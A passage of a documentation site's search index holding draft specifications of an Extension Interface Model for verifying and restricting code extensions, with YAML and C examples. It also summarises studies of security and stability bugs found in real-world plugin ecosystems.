</ul>"},{"location":"bpftime/EIM/draft-spec/spec/#verification-process","title":"Verification Process","text":"<p>The verifier checks the extension against the assigned role:</p> <ol> <li>Type Consistency: Ensures all parameters and returns align with their type constraints.</li> <li>Constraint Compliance: Ensures all constraints at all levels (type, function, capability, role) are satisfied.</li> <li>Capability and Role Alignment: Ensures the extension only uses helpers allowed by capabilities permitted in the role. Any forbidden capabilities (e.g., <code>!NetAccess</code>) or actions (<code>side_effect</code>) result in verification failure.</li> <li>Error Handling: If a helper returns a value that must be checked (e.g., a file descriptor that could be negative) and the extension fails to verify it before using it with another helper demanding a positive value, verification fails.</li> </ol> <p>If verification passes, the extension loads safely. Otherwise, it is rejected.</p>"},{"location":"bpftime/EIM/draft-spec/spec/#oop-analogy-non-normative","title":"OOP Analogy (Non-Normative)","text":"<p>While EIM is not object-oriented, one may draw a conceptual analogy:</p> <ul> <li>Roles: Similar to classes, defining a blueprint of what extension entries are exposed and what capabilities and constraints apply.</li> <li>Extensions: Similar to objects (instances of roles). Assigning a role to an codebase is like creating an object from a class. The extension code (like object methods) to be loaded must adhere to constraints (like class invariants).</li> <li>Types, Constraints, and Capabilities: Analogous to type checks, resource policies, and method sets in a class.</li> </ul> <p>This analogy is informal and only intended to help conceptual understanding.</p>"},{"location":"bpftime/EIM/draft-spec/spec/#conclusion","title":"Conclusion","text":"<p>This specification provides a formal framework where Types, Extension-Exported Entries, Host-Provided Functions (Helpers), Capabilities, Roles, and Constraints work together to ensure safe, controlled execution of dynamically loaded extensions. The model emphasizes minimal definitions, strong verification steps, and least-privilege design.</p> <p>Share on  Share on </p>"},{"location":"bpftime/EIM/draft-spec/spec_core/","title":"Spec core","text":""},{"location":"bpftime/EIM/draft-spec/spec_core/#extension-interface-model-eim-v2","title":"Extension Interface Model (EIM) V2","text":""},{"location":"bpftime/EIM/draft-spec/spec_core/#1-introduction","title":"1. Introduction","text":"<p>The Extension Interface Model (EIM) is a specification framework that defines how a host environment can describe, verify, and regulate extensions\u2014code modules that integrate with a host application or system to provide additional functionality. Such extensions may be introduced at various stages, including compile-time, link-time, load-time, or even dynamically at runtime. EIM ensures that each extension operates within rigorously defined boundaries, adheres to declared safety constraints, and invokes only authorized host-provided interfaces.</p> <p>By specifying types, capabilities, constraints, and extension interface points (entries), EIM imposes a least-privilege model that enables safe integration without sacrificing flexibility or expressiveness. The EIM is independent of any particular runtime technology or programming language: implementers can define and enforce EIM specifications using different verification mechanisms and execution environments.</p>"},{"location":"bpftime/EIM/draft-spec/spec_core/#2-key-concepts","title":"2. Key Concepts","text":"<ul> <li>Types: Typed parameters and return values, each constrained by conditions ensuring safe usage (e.g., non-null, resource-limited).</li> <li>Extension-Exported Entries (Extension Functions): Functions exposed by the extension that the host can call into. They define explicit contracts for behavior, preconditions, and postconditions.</li> <li>Host-Provided Functions (Helpers): Functions or interfaces provided by the host and selectively available to extensions. Helpers grant controlled access to system resources and must be explicitly authorized.</li> <li>Capabilities: Named permission bundles that group sets of allowed helpers and impose associated constraints, enabling fine-grained control over what an extension can do.</li> <li>Constraints: Logical conditions attached to types, capabilities, and interfaces that ensure the extension\u2019s behavior remains safe, correct, and predictable.</li> </ul> <p>The EIM specification is a framework for system designers: it is not a one-size-fits-all solution but rather a customizable blueprint that can be tuned to balance safety, performance, and expressiveness. Designers define their own types, constraints, capabilities, and extension entries according to their specific application domain and risk profile.</p>"},{"location":"bpftime/EIM/draft-spec/spec_core/#3-normative-references","title":"3. Normative References","text":"<p>The terms \"MUST\", \"MUST NOT\", \"SHOULD\", and \"SHOULD NOT\" are interpreted as defined in [RFC 2119].</p> <p>Unless explicitly stated otherwise, all statements in this document are normative requirements.</p>"},{"location":"bpftime/EIM/draft-spec/spec_core/#4-terminology","title":"4. Terminology","text":"<ul> <li>Extension: A code module integrated with a host, which may be introduced at various integration points (e.g., at build-time, through static linking, or dynamically at runtime).</li> <li>Host Environment: The encompassing runtime or system that loads or links the extension and enforces EIM rules. The host environment provides helpers and a verification mechanism.</li> <li>Verifier: A component of the host environment that checks an extension\u2019s compliance with the EIM specification before allowing execution.</li> </ul>"},{"location":"bpftime/EIM/draft-spec/spec_core/#5-types","title":"5. Types","text":"<p>A Type <code>\u03c4</code> is <code>(BaseType, Constraints(\u03c4))</code>, where:</p> <ul> <li>BaseType: A primitive or composite data type (e.g., <code>int</code>, <code>size_t</code>, <code>char*</code>, or a specific struct).</li> <li>Constraints(\u03c4): A finite set of verifiable conditions (e.g., <code>value \u2265 0</code>, <code>non_null</code>).</li> </ul> <p>Requirements:</p> <ul> <li>Type constraints MUST be statically or symbolically checkable to ensure safety and correctness before the extension executes.</li> <li>All parameters and return values in extension entries and helpers MUST define their type and adhere to the associated constraints.</li> </ul> <p>Example:</p> <pre><code>types:\n  - name: \"int_positive\"\n    base: \"int\"\n    constraints:\n      - \"value \u2265 0\"\n  - name: \"const_char_ptr\"\n    base: \"char*\"\n    constraints:\n      - \"non_null\"\n      - \"null_terminated\"\n</code></pre>"},{"location":"bpftime/EIM/draft-spec/spec_core/#6-constraints","title":"6. Constraints","text":"<p>Constraints enforce safe, correct, and resource-limited behavior.</p> <p>Two Classes of Constraints:</p> <ol> <li>Relational Constraints: Express logical relationships and resource bounds (e.g., <code>value \u2265 0</code>, <code>memory_usage \u2264 65536</code>).</li> <li>Tag-Based Constraints: Mark semantic properties or operational modes (e.g., <code>read_only = true</code>, <code>side_effects = false</code>).</li> </ol> <p>Requirements:</p> <ul> <li>Constraints MUST be decidable.</li> <li>Violating any constraint at verification time MUST prevent the extension from running.</li> <li>Constraints may encode functional correctness, resource limits, security policies, or side-effect restrictions.</li> </ul>"},{"location":"bpftime/EIM/draft-spec/spec_core/#7-host-provided-functions-helpers","title":"7. Host-Provided Functions (Helpers)","text":"<p>Helpers are controlled entry points to host functionality. They represent operations like reading from a file, allocating memory, or sending a network packet. Access to these functions is restricted by capabilities.</p> <p>Definition:</p> <pre><code>h = (Name_h, (\u03c41, \u03c42, ..., \u03c4n) -&gt; \u03c4_out, Helper_Constraints)\n</code></pre> <ul> <li><code>(\u03c41, \u03c42, ..., \u03c4n)</code>: Parameter types, each with constraints.</li> <li><code>\u03c4_out</code>: A return type with type-level constraints.</li> <li><code>Helper_Constraints</code>: Additional pre/postconditions (e.g., <code>return \u2265 -1</code>).</li> </ul> <p>Requirements:</p> <ul> <li>Each helper MUST specify its signature and constraints.</li> <li>The verifier MUST reject extensions that violate these constraints.</li> </ul> <p>Example:</p> <pre><code>host_functions:\n  - name: \"host_read_file\"\n    signature:\n      params:\n        - { type: \"int_positive\", name: \"fd\" }\n      return_type: \"int\"\n    function_constraints:\n      - \"return \u2265 -1\"\n</code></pre>"},{"location":"bpftime/EIM/draft-spec/spec_core/#8-capabilities","title":"8. Capabilities","text":"<p>Capabilities bundle sets of helpers and impose overarching constraints. By assigning capabilities to an extension entry, the host grants controlled access to specific functionalities.</p> <p>Definition:</p> <pre><code>Capability = (Name_c, H_c, Cap_Constraints)\n</code></pre> <ul> <li><code>Name_c</code>: The capability\u2019s name.</li> <li><code>H_c</code>: The set of host-provided functions included in this capability.</li> <li><code>Cap_Constraints</code>: Constraints applying to all helpers in this capability.</li> </ul> <p>Requirements:</p> <ul> <li>The extension can only invoke helpers from capabilities it is allowed to use.</li> <li>Conflicting constraints within a capability\u2019s definition MUST cause verification to fail.</li> </ul> <p>Example:</p> <pre><code>capabilities:\n  - name: \"FileRead\"\n    apis: [\"host_read_file\"]\n    constraints:\n      - \"read_only = true\"\n</code></pre>"},{"location":"bpftime/EIM/draft-spec/spec_core/#9-extension-exported-entries-extension-functions","title":"9. Extension-Exported Entries (Extension Functions)","text":"<p>Extension-exported entries are the callable interfaces through which the host invokes the extension\u2019s functionality. Each entry declares its input/output types, constraints, and allowed capabilities.</p> <p>Definition:</p> <pre><code>e = (Name_e, (\u03c41, \u03c42, ..., \u03c4m) -&gt; \u03c4_out, E_Constraints, Allowed_Capabilities)\n</code></pre> <ul> <li><code>Name_e</code>: Name of the extension-exported entry.</li> <li><code>(\u03c41, \u03c42, ..., \u03c4m) -&gt; \u03c4_out</code>: Parameter and return types, each with defined constraints.</li> <li><code>E_Constraints</code>: Additional constraints relevant to this entry.</li> <li><code>Allowed_Capabilities</code>: The set of capabilities (and thus helpers) this entry may use.</li> </ul> <p>Requirements:</p> <ul> <li>Each extension entry MUST specify types and constraints for parameters and return values.</li> <li>The extension\u2019s internal logic MUST NOT violate any of these constraints.</li> <li>Allowed capabilities define the operational scope of the entry, ensuring fine-grained access control.</li> </ul> <p>Example:</p> <pre><code>extension_entries:\n  - name: \"process_data\"\n    signature:\n      params:\n        - { type: \"int_positive\", name: \"count\" }\n      return_type: \"int_positive\"\n    constraints:\n      - \"return \u2265 0\"\n      - \"memory_usage \u2264 65536\"\n      - \"side_effects = false\"\n    allowed_capabilities:\n      - \"FileRead\"\n</code></pre> <p>Here, <code>process_data</code> can read files via <code>host_read_file</code> but not perform network operations or other disallowed actions.</p>"},{"location":"bpftime/EIM/draft-spec/spec_core/#10-verification-process","title":"10. Verification Process","text":"<p>Before an extension is integrated and executed, the verifier checks:</p> <ol> <li>Type Checking: Validate that parameters and returns match the specified types and constraints.</li> <li>Constraint Compliance: Verify that all declared constraints (types, helpers, capabilities, and entries) are satisfied.</li> <li>Capability Matching: Ensure the extension only invokes helpers from the allowed capabilities.</li> <li>Resource and Safety Checks: Confirm that resource limits and safety conditions (e.g., <code>side_effects = false</code>) hold.</li> <li>Failure Handling: If any requirement fails, the verifier MUST reject the extension, preventing unsafe integration.</li> </ol> <p>These checks may occur offline (pre-deployment), at compile-time, link-time, or dynamically at runtime, depending on the host\u2019s verification strategy.</p>"},{"location":"bpftime/EIM/draft-spec/spec_core/#11-extensibility-and-compliance","title":"11. Extensibility and Compliance","text":"<p>The EIM specification is designed to be extensible:</p> <ul> <li>Customization: Implementers can define new base types, constraints, and capabilities as their domain requires.</li> <li>Incremental Updates: The specification can evolve, and tools can be versioned, allowing ongoing refinement of constraints and capabilities.</li> <li>Compliance Documentation: Hosts and extension authors SHOULD document which version of the EIM specification they follow and what verifiers they use.</li> </ul>"},{"location":"bpftime/EIM/draft-spec/spec_core/#12-non-normative-notes","title":"12. Non-Normative Notes","text":"<p>Although the EIM framework is language-agnostic, developers can integrate it with type-checkers, static analyzers, symbolic verification tools, or specialized eBPF-style verifiers. Capabilities serve as permission sets, while constraints and types form a contract-based system ensuring correctness and safety. The principles align with a least-privilege philosophy, offering a flexible means to balance security, performance, and programmability.</p>"},{"location":"bpftime/EIM/draft-spec/spec_core/#summary-of-changes-and-improvements","title":"Summary of Changes and Improvements","text":"<ol> <li>Generalization Beyond Dynamic Loading:  </li> <li>Before: The original text focused on extensions as dynamically loaded code.  </li> <li> <p>After: We now emphasize that extensions can be integrated at various stages (compile-time, link-time, load-time, or runtime), making the model applicable to a wider range of integration scenarios.</p> </li> <li> <p>Clarified Terminology:  </p> </li> <li>Before: Some wording suggested a narrow scope for application and verification.  </li> <li> <p>After: Terms like \"Host Environment\" and \"Verifier\" are now more clearly defined, and we\u2019ve removed language that implies purely dynamic loading.</p> </li> <li> <p>More Explicit Requirements:  </p> </li> <li>Before: Certain requirements were implied but not always explicitly stated.  </li> <li> <p>After: Requirements for constraints, types, and helpers are now stated directly, making it clearer how verification must proceed and what conditions must hold.</p> </li> <li> <p>Added a Section on Extensibility and Compliance:  </p> </li> <li>Before: There was no direct guidance on evolving or extending the specification.  </li> <li> <p>After: A new section on extensibility clarifies how the EIM specification can grow over time and how implementers can indicate compliance and versions.</p> </li> <li> <p>Refined Non-Normative Notes:  </p> </li> <li>Before: The notes were mostly analogies to OOP concepts.  </li> <li> <p>After: The notes now emphasize verification techniques and the principle-of-least-privilege design philosophy, offering broader context to potential implementers.</p> </li> <li> <p>Improved Consistency and Organization:  </p> </li> <li>Before: Some sections mixed normative and descriptive language.  </li> <li>After: The text now consistently uses normative language where required, and descriptive examples are clearly delineated.</li> </ol> <p>Through these changes, the revised EIM specification presents a more flexible, clearer, and more general framework that applies to a range of extension-integration models, not just dynamic loading. This updated specification is better structured, more explicit, and easier to adapt to different systems and verification strategies.</p> <p>Share on  Share on </p>"},{"location":"bpftime/EIM/draft-spec/spec_old/","title":"Extension Model Specification V1","text":""},{"location":"bpftime/EIM/draft-spec/spec_old/#overview","title":"Overview","text":"<p>The Extension Permission and Control Model (EIM) provides a structured, formally verifiable framework to control the behavior of dynamically loaded extensions within a host environment. EIM uses roles, capabilities, typed interfaces, and attributes to define what operations an extension may perform, how it may perform them, and under what resource constraints.</p> <p>Key highlights:</p> <ol> <li>Roles: Assign permission bundles to extensions.</li> <li>Capabilities: Define sets of allowed host APIs with well-defined type signatures and constraints.</li> <li>Attributes: Impose quantitative and qualitative resource and operational limits.</li> <li>Typed Interfaces: Ensure that every host and extension function adheres to specified type constraints, enabling static analysis and formal verification.</li> <li>Inheritance and Composition: Support scalable, modular configuration of permissions and attributes.</li> <li>Formal Verification: The model and its configurations are designed for formal verification by a verifier that checks correctness, consistency, and adherence to constraints at load time or during a pre-deployment analysis phase.</li> </ol>"},{"location":"bpftime/EIM/draft-spec/spec_old/#formal-language-and-definitions","title":"Formal Language and Definitions","text":""},{"location":"bpftime/EIM/draft-spec/spec_old/#basic-sets-and-domains","title":"Basic Sets and Domains","text":"<ul> <li>Let <code>H</code> be a finite set of Host APIs (host-provided functions).</li> <li>Let <code>E</code> be a finite set of Extension Exported Functions (extension-provided entry points).</li> <li>Let <code>T</code> be a set of Types, each with associated constraints and properties.</li> <li>Let <code>C</code> be a set of Capabilities.</li> <li>Let <code>R</code> be a set of Roles.</li> <li>Let <code>A</code> be a set of Attributes applicable to roles, capabilities, and extensions. Can be used to check the compatibility or applicability between Capabilities and Roles.</li> </ul> <p>We introduce a specification language that can be represented in YAML/JSON or a domain-specific language (DSL). The semantics remain the same.</p>"},{"location":"bpftime/EIM/draft-spec/spec_old/#types-and-constraints","title":"Types and Constraints","text":"<p>Definition (Type): A type <code>\u03c4 \u2208 T</code> is defined as <code>(BaseType, Constraints)</code>, where: - <code>BaseType</code> is a primitive (e.g., <code>int</code>, <code>size_t</code>, <code>char*</code>) or composite (e.g., struct) type. - <code>Constraints</code> is a finite set of logical predicates over values of that type. Examples:   - Non-null pointer: <code>value \u2260 NULL</code>   - Bounded integer: <code>0 \u2264 value \u2264 100</code>   - Null-terminated string: <code>\u2200 i, value[i] \u2260 '\\0'</code> until a terminating null is found</p> <p>Type System Requirements: - For each <code>\u03c4 \u2208 T</code>, <code>Constraints(\u03c4)</code> must be decidable predicates, allowing static or symbolic verification. - The verifier can check, for every function call, that arguments and return values respect these constraints.</p> <p>Example Type Definitions: <pre><code>types:\n  - name: \"const_char_ptr\"\n    base: \"char*\"\n    constraints: [\"non_null\", \"null_terminated\"]\n\n  - name: \"int_positive\"\n    base: \"int\"\n    constraints: [\"value \u2265 0\"]\n</code></pre></p>"},{"location":"bpftime/EIM/draft-spec/spec_old/#host-apis","title":"Host APIs","text":"<p>Definition (Host Function): Each host function <code>h \u2208 H</code> is defined as: <pre><code>h = (Name_h, (\u03c41, \u03c42, ..., \u03c4n) -&gt; \u03c4_out, F_Constraints)\n</code></pre> - <code>Name_h</code>: A unique identifier (string). - <code>(\u03c41, \u03c42, ..., \u03c4n)</code>: Parameter types. - <code>\u03c4_out</code>: Return type. - <code>F_Constraints</code>: A set of logical conditions specifying preconditions, postconditions, and invariants. For example, if <code>\u03c4_out</code> is <code>int</code> representing a file descriptor, <code>F_Constraints</code> might state: \"If return &lt; 0, error occurred; else resource is valid.\" Or, the constraints can define the relationship between the arguments, such as the first argument is a non-null pointer to a null-terminated string, the second argument is the size of the buffer. - <code>Attributes</code>: Some host functions may have attributes if they have side effects. For example, create a file will change the disk, or make a network call will change the network state. They have attributes like <code>may_have_side_effect = true</code>.</p> <p>The verifier checks: - That each call made by the extension to <code>h</code> satisfies <code>F_Constraints</code>. - Argument and return types match the signature and type constraints. - For some host functions, the verifier also check and record the resource allocation and deallocation. So we can identify the leak of some resources.</p> <p>Example in C: <pre><code>int host_open_file(const char *filename, const char *mode);\nvoid* host_malloc(size_t size);\nvoid host_free(void* ptr);\n</code></pre></p>"},{"location":"bpftime/EIM/draft-spec/spec_old/#extension-exported-functions","title":"Extension Exported Functions","text":"<p>Similarly, extension functions <code>e \u2208 E</code> are defined: <pre><code>e = (Name_e, (\u03c41, \u03c42, ..., \u03c4m) -&gt; \u03c4_out, E_Constraints)\n</code></pre> - The host may call these functions. - The verifier ensures these also adhere to their constraints.</p> <p>example in C: <pre><code>UPROBE_ENTRY(extension_entry, (int, int) -&gt; void)\n{\n    ...\n}\n</code></pre></p>"},{"location":"bpftime/EIM/draft-spec/spec_old/#capabilities","title":"Capabilities","text":"<p>Definition (Capability): A capability <code>c \u2208 C</code> is defined as: <pre><code>c = (Name_c, H_c, Cap_Constraints)\n</code></pre> - <code>Name_c</code>: Unique capability name. - <code>H_c \u2286 H</code>: A subset of host APIs exposed to the extension. - <code>Cap_Constraints</code>: Additional constraints or policies applying to these APIs as a group. For example, <code>Cap_Constraints</code> might restrict usage frequency or data size.</p> <p>Capability Composition: Given <code>c1 = (Name_c1, H_c1, CapCon1)</code> and <code>c2 = (Name_c2, H_c2, CapCon2)</code>, a composed capability <code>c_comp</code> is: <pre><code>c_comp = (Name_comp, H_c1 \u222a H_c2, CapCon_comp)\n</code></pre> <code>CapCon_comp</code> must be derived so that all constraints remain satisfiable. If any constraints conflict (e.g., one requires read-only and the other requires write access), composition fails unless explicitly resolved by a policy. The verifier checks logical consistency of combined constraints.</p>"},{"location":"bpftime/EIM/draft-spec/spec_old/#attributes","title":"Attributes","text":"<p>Attributes <code>A</code> are key-value pairs that impose resource and operational constraints: - <code>A.max_memory</code>: Maximum memory (in bytes) the extension can use. - <code>A.max_instructions</code>: Maximum instruction count per invocation. - <code>A.allow_memory_write</code>: Boolean indicating if extension can write to host memory (if allowed by host APIs). - <code>A.network_access</code>: Boolean controlling network operations. - Other domain-specific attributes as required.</p> <p>The verifier ensures that attribute constraints are not violated by the extension\u2019s code or by the chosen capabilities. For instance, if <code>allow_memory_write = false</code> but a chosen capability grants <code>host_write_mem</code>, verification fails or the extension is denied loading.</p>"},{"location":"bpftime/EIM/draft-spec/spec_old/#roles","title":"Roles","text":"<p>Definition (Role): <pre><code>R = (Name_R, Capabilities_R, Attributes_R, Parents_R)\n</code></pre> Where: - <code>Name_R</code>: Unique role name. - <code>Capabilities_R \u2286 C</code>: The set of capabilities granted by this role. - <code>Attributes_R</code>: A mapping from attribute keys to values. - <code>Parents_R \u2286 R</code>: Zero or more parent roles from which <code>R</code> inherits.</p> <p>Inheritance Rules: - Capabilities: Union of capabilities from parents and this role. The verifier checks for conflicts in composed capabilities. - Attributes: If parents define the same attribute differently, the child must explicitly resolve the conflict or the verifier rejects the role. Attributes are merged following a deterministic policy (e.g., the child\u2019s explicit setting overrides parent settings). - Types and constraints from parents must not be weakened. Contradictions in type constraints result in a verification error.</p> <p>The final effective permissions of a role <code>R_eff</code> are: <pre><code>R_eff = (Name_R, Union of all parent capabilities + self, Resolved_Attributes, ...)\n</code></pre> The verifier processes the inheritance graph to produce a conflict-free, fully expanded set of capabilities and attributes.</p>"},{"location":"bpftime/EIM/draft-spec/spec_old/#assigning-roles-to-extensions","title":"Assigning Roles to Extensions","text":"<p>When loading an extension <code>X</code>, the host assigns one or more roles <code>R_assigned</code>. The effective permissions of <code>X</code> are the intersection of constraints imposed by all these roles combined. If any conflict arises, verification fails and the host rejects the extension.</p>"},{"location":"bpftime/EIM/draft-spec/spec_old/#formal-verification-approach","title":"Formal Verification Approach","text":"<p>A verifier tool is run at deployment or load time. It checks:</p> <ol> <li> <p>Type Consistency:    For each host API in each capability, and each extension-exported function, the verifier confirms that all arguments and return values satisfy the declared type constraints.    If <code>int_positive</code> is required and the extension code can produce negative integers (detected via static analysis or symbolic execution), verification fails.</p> </li> <li> <p>Attribute Compliance:    The verifier analyzes instructions, memory usage patterns (statically approximated), and API calls to ensure they do not exceed the specified attributes.    For example, if <code>max_memory = 1048576</code>, the verifier ensures that no sequence of valid API calls can cause allocation beyond 1MB of memory. This may rely on conservative static analysis and symbolic constraints.</p> </li> <li> <p>Capability and Role Composition:    The verifier checks that all composed capabilities and inherited roles produce a logically consistent set of constraints.  </p> </li> <li>If two parent roles define contradictory constraints for the same API, verification fails.</li> <li> <p>If a composed capability is formed from <code>FileRead</code> and <code>FileWrite</code>(They have attributes like <code>read_only = true</code> and <code>read_only = false</code> respectively) but has contradictory <code>read_only</code> constraints, verification fails or requires explicit resolution.</p> </li> <li> <p>Non-functional Properties (optional):    The verifier can also check additional invariants like no possible null dereferences if <code>non_null</code> is specified, or no buffer overflows if length constraints are declared.</p> </li> </ol> <p>Verification Algorithmic Aspects: - The verifier may use a combination of:   - Type checking: Ensuring types match declared signatures.   - Symbolic execution: Exploring code paths in the extension to ensure no violation of constraints.   - Policy-driven resolution: If multiple parents define the same attribute, the verifier enforces a predefined priority.</p> <p>If verification succeeds, the host loads the extension with full confidence that the declared roles and capabilities are safe and consistent. If verification fails, the loading is aborted.</p>"},{"location":"bpftime/EIM/draft-spec/spec_old/#examples","title":"Examples","text":""},{"location":"bpftime/EIM/draft-spec/spec_old/#example-1-simple-roles-and-capabilities","title":"Example 1: Simple Roles and Capabilities","text":"<pre><code>types:\n  - name: \"const_char_ptr\"\n    base: \"char*\"\n    constraints: [\"non_null\", \"null_terminated\"]\n\n  - name: \"int_positive\"\n    base: \"int\"\n    constraints: [\"value \u2265 0\"]\n\nhost_functions:\n  - name: \"host_open_file\"\n    signature:\n      params:\n        - {type: \"const_char_ptr\", name: \"filename\"}\n        - {type: \"const_char_ptr\", name: \"mode\"}\n      return_type: \"int\"\n    function_constraints:\n      - \"filename.non_null\"\n      - \"mode.non_null\"\n      - \"return \u2265 -1\"\n      - \"If return &lt; 0, indicates an error.\"\n\ncapabilities:\n  - name: \"FileRead\"\n    apis: [\"host_open_file\", \"host_read_file\"]\n    constraints: [\"All returned file descriptors must be checked before use\"]\n\n  - name: \"FileWrite\"\n    apis: [\"host_write_file\"]\n\nroles:\n  - name: \"BasicFileRole\"\n    capabilities: [\"FileRead\"]\n    attributes:\n      max_memory: 1048576\n      allow_memory_write: false\n      max_instructions: 1000000\n    inherits: []\n\n  - name: \"ExtendedFileRole\"\n    capabilities: [\"FileWrite\"]\n    # Inherits FileRead from BasicFileRole\n    inherits: [\"BasicFileRole\"]\n\n# The verifier checks:\n# - No conflicts in capabilities.\n# - Attributes inherited properly.\n# If all checks pass, ExtendedFileRole effectively grants host_open_file, host_read_file, host_write_file, with specified attributes.\n</code></pre>"},{"location":"bpftime/EIM/draft-spec/spec_old/#example-2-verifying-type-constraints","title":"Example 2: Verifying Type Constraints","text":"<p>Suppose the extension exports: <pre><code>extension_exports:\n  - name: \"process_data\"\n    signature:\n      params:\n        - {type: \"int_positive\", name: \"count\"}\n      return_type: \"const_char_ptr\"\n    constraints:\n      - \"If return \u2260 NULL, must be a null_terminated string\"\n</code></pre> The verifier ensures: - The extension\u2019s code never passes a negative integer to <code>count</code>. - The returned pointer is always valid and null-terminated if not NULL.</p> <p>If verification finds a path where <code>count</code> could be negative, loading is rejected.</p>"},{"location":"bpftime/EIM/draft-spec/spec_old/#conclusion","title":"Conclusion","text":"<p>This specification describes a comprehensive and formally verifiable permission and control model for extensions. By integrating typed interfaces, capabilities, attributes, roles, and a formal verification process, it ensures a robust, secure, and analyzable framework suitable for production systems and academic research.</p> <p>The model\u2019s modular design, combinable capabilities, and inheritable roles provide flexibility. The rigorous typing and verification approach ensures that any permitted operation is safe, well-defined, and consistent with stated constraints, reducing runtime errors and security vulnerabilities.</p> <p>Share on  Share on </p>"},{"location":"bpftime/EIM/study/","title":"studies on bugs in extensions/plugins","text":"<p>We have done several studies on bugs in extensions/plugins:</p> <ol> <li>Browser Extensions and IDE Plugins</li> <li>Database and Web Server Extensions</li> <li>Hypervisor and Container Extensions</li> <li>Productivity Software and Game Extensions/Plugins</li> </ol> <p>Each study included around 20 real-world cases, documenting common patterns, impacts, statistics, and root causes.</p>"},{"location":"bpftime/EIM/study/#summary-of-findings-across-extension-ecosystems","title":"Summary of Findings Across Extension Ecosystems","text":""},{"location":"bpftime/EIM/study/#1-diverse-extension-environments-similar-vulnerabilities","title":"1. Diverse Extension Environments, Similar Vulnerabilities","text":"<p>Despite targeting different host platforms\u2014browsers and IDEs, database and web server engines, and hypervisor/container orchestration\u2014the extension or plugin model consistently introduces comparable classes of bugs. In all three domains, extensions/plugins often run with broad privileges, interact with untrusted data, or integrate deeply with the host application\u2019s internals. As a result, logic flaws, memory errors, and security oversights can lead to critical vulnerabilities, including:</p> <ul> <li>Remote Code Execution (RCE): Extensions that allow file manipulation, script injection, or direct system calls can be exploited to run arbitrary code. For instance, a malicious browser extension feature (e.g., rewriting scripts) or a vCenter plugin with an open file-upload endpoint directly led to RCE.</li> <li>Privilege Escalation and Policy Bypass: Add-ons such as IDE plugins, Kubernetes admission controllers, or database script extensions can inadvertently grant higher privileges than intended. Multiple cases across the studies showed how logic oversights in extension permission checks enabled low-privileged or unauthenticated attackers to escalate privileges, bypass security policies, or hijack sensitive operations.</li> <li>Memory-Safety Bugs: In lower-level systems\u2014like web server modules (Apache, Nginx), database plugins (MySQL, Redis), and hypervisor drivers (libvirt, Xen)\u2014heap/buffer overflows, use-after-free errors, and other memory mismanagement led to crashes, data corruption, or RCE. This matches well-known industry data that memory-safety issues dominate critical vulnerabilities in C/C++ code.</li> </ul>"},{"location":"bpftime/EIM/study/#2-common-root-causes","title":"2. Common Root Causes","text":"<p>The studies converge on several root cause patterns:</p> <ul> <li>Insufficient Input Validation &amp; Over-Trust: Many severe extension bugs arise when user, network, or project-file inputs are trusted without robust checks. For example, ad blockers injecting scripts via overly permissive filters, or a vCenter plugin failing to authenticate file uploads.  </li> <li>Logic and Design Oversights: Critical \u201cbypass\u201d vulnerabilities typically reflect flawed assumptions about state, trust boundaries, or concurrency. Cases included:  </li> <li>Browser/IDE: Overlooking the domain context, enabling universal XSS, reusing credentials in the wrong context.  </li> <li>Database/Web Servers: Mishandling extension scripts or module commands, leading to injection or privilege confusion.  </li> <li>Hypervisor/Containers: Race conditions in policy engines (Kubernetes Gatekeeper, Falco) or incorrectly merged network policies (Cilium).  </li> <li>Privilege/Policy Misconfiguration: Plugins frequently have more power than necessary, so any single oversight (e.g., forgetting to enforce authentication) can grant an attacker host-level capabilities. This was evident in multiple VMware plugin vulnerabilities, Docker authorization bypasses, and Cilium\u2019s network policy errors.  </li> <li>Resource and Concurrency Bugs: Memory leaks, infinite loops, or concurrency issues (like race conditions) were found in all three sets\u2014some triggered denial-of-service, others silently broke functionality (e.g., memory exhaustion in Xen\u2019s XAPI or a crash loop in an IDE plugin).  </li> </ul>"},{"location":"bpftime/EIM/study/#3-impacts-on-security-stability-and-maintainability","title":"3. Impacts on Security, Stability, and Maintainability","text":"<ul> <li>High-Severity Security Risks: Across all three studies, 60\u201380% of documented bugs had direct security implications, often scoring high CVSS (8.0\u20139.8). The biggest danger is that many extensions run in-process with high privileges, so a vulnerability can compromise the entire host.  </li> <li>Performance Degradation and Crashes: Non-security bugs\u2014like memory leaks or infinite retry loops\u2014commonly drained CPU/RAM, causing host slowdowns, browser/IDE hang-ups, or cluster-wide outages (e.g., a malicious request crashing Nginx or a cunningly crafted storage pool definition bringing down libvirt).  </li> <li>Data Leakage and Integrity Failures: Several bugs resulted in unauthorized disclosure of credentials (e.g., token leaks in LastPass, JetBrains GitHub plugin, or Cilium debug logs) or potential data corruption in databases.  </li> <li>Compatibility and Deployment Headaches: Extensions complicate upgrades and maintenance. For instance, some IDE or database upgrades failed because an extension was not updated in tandem, forcing manual or emergency patching. Meanwhile, ephemeral container or hypervisor add-ons (plugins or drivers) that are misconfigured can cause repeated crash loops or require significant debugging time.  </li> </ul>"},{"location":"bpftime/EIM/study/#4-statistical-observations","title":"4. Statistical Observations","text":"<p>Although the three studies examine different ecosystems, the breakdown of bugs is strikingly similar:</p> <ul> <li>Security vs. General Bugs: The majority of publicly reported extension bugs are security-focused (roughly 60\u201380%), especially those with CVE identifiers. In real-world usage, performance/logic issues are also widespread but often appear in bug trackers rather than official advisories.  </li> <li>Frequent Bug Types:  </li> <li>Logic errors (policy bypasses, injection) are widespread in both high-level (JavaScript-based browser/IDE) and lower-level (C-based webserver/database) extensions.  </li> <li>Memory corruption is more prevalent in database/web server or hypervisor extension code, since they typically use native languages for performance.  </li> <li>Infinite loops, memory leaks, concurrency races occur across all extension ecosystems, from IDE plug-ins in Java to container policy controllers in Go.  </li> <li>Severity: About 25\u201330% of the bugs across each dataset are \u201ccritical\u201d or \u201chigh\u201d severity (RCE, major privilege escalation, or complete denial-of-service). Another 30\u201340% are medium severity (like partial policy bypass, token leaks, or major memory bloat). The remainder involve lower-impact or narrower-scope issues.  </li> <li>Root Cause: Over 90% of the severe security bugs arise from logic/design flaws or input validation issues\u2014rather than classic memory corruption alone. Nonetheless, memory-safety errors remain a leading cause of the worst (RCE) vulnerabilities in native-code extensions.</li> </ul>"},{"location":"bpftime/EIM/study/#5-lessons-and-recommendations","title":"5. Lessons and Recommendations","text":"<ul> <li>Extension Hardening &amp; Privilege Isolation: Because a single extension flaw can compromise the entire system, vendors and administrators should isolate or sandbox plugin code where feasible, minimizing what an extension can access. This is especially critical in virtualization (VMware, Xen, Docker) and enterprise (IDE, DB) contexts.  </li> <li>Robust Secure Coding Practices: For memory-heavy or native-code plugins, strict memory-safety measures, fuzz testing, and code review are essential to prevent buffer overflows or use-after-free. For higher-level extensions, carefully validate untrusted inputs and domain contexts.  </li> 